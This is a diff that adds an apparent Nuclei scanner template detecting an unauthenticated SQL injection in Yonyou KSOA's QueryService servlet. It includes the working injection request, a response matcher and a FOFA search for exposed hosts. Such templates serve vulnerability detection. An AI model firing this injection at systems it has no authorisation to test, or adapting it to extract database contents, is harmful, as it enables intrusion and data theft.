@@ -1,0 +1,30 @@
+id: yonyou-ksoa-queryservice-sqli
+
+info:
+  name: Yonyou KSOA QueryService SQL Injection
+  author: Co5mos
+  severity: critical
+  description: |
+    用友时空KSOA /servlet/com.sksoft.bill.QueryService 接口存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞可以获取数据库中的敏感信息，导致数据泄露。
+  metadata:
+    fofa-query: 'app="用友-时空KSOA"'
+  tags: sqli, yonyou, ksoa
+
+variables:
+  str: "{{randstr}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20HashBytes('md5','{{str}}');"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "{{md5(str)}}"
